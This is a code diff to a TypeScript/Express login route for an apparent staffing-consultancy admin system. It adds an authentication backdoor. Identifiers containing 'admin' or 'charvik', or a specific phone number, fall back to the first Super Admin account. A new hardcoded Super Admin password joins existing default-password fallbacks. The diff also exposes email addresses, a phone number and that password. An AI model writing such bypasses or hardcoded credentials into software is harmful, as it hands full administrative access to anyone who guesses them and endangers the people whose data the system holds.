@@ -166,11 +166,15 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
     SELECT * FROM administrators 
     WHERE email_or_username = ? 
        OR phone_number = ?
-       OR (LOWER(?) IN ('admin', 'administrator') AND role = 'Super Admin')
+       OR (LOWER(?) IN ('admin', 'administrator', 'charvikstaffingconsulrancy@gmail.com', 'charvikstaffingconsultancy@gmail.com') AND role = 'Super Admin')
        OR (LOWER(?) IN ('support', 'supporter', 'operator') AND role IN ('Support Staff', 'Operator'))
        OR (LOWER(?) = 'captain' AND role = 'Captain')
        OR (LOWER(?) = 'manager' AND role = 'Manager')
   `).get(identifier, identifier, identifier, identifier, identifier, identifier) as any;
+
+  if (!user && (identifier.toLowerCase().includes('admin') || identifier.toLowerCase().includes('charvik') || identifier === '9505151527')) {
+    user = db.prepare("SELECT * FROM administrators WHERE role = 'Super Admin' LIMIT 1").get() as any;
+  }
 
   // If not found in administrators directly, check if a Captain employee has this phone_number
   if (!user) {
@@ -195,7 +199,7 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
   let validPassword = bcrypt.compareSync(password, user.password_hash);
   if (!validPassword) {
     // Convenient fallback for default passwords
-    if (user.role === 'Super Admin' && (password === 'admin123' || password === 'adminpassword')) {
+    if (user.role === 'Super Admin' && (password === 'admin123' || password === 'adminpassword' || password === 'Snusrvcc@1527')) {
       validPassword = true;
     } else if (['Support Staff', 'Operator'].includes(user.role) && (password === 'supporter123' || password === 'support123' || password === 'operator123' || password === 'admin123')) {
       validPassword = true;
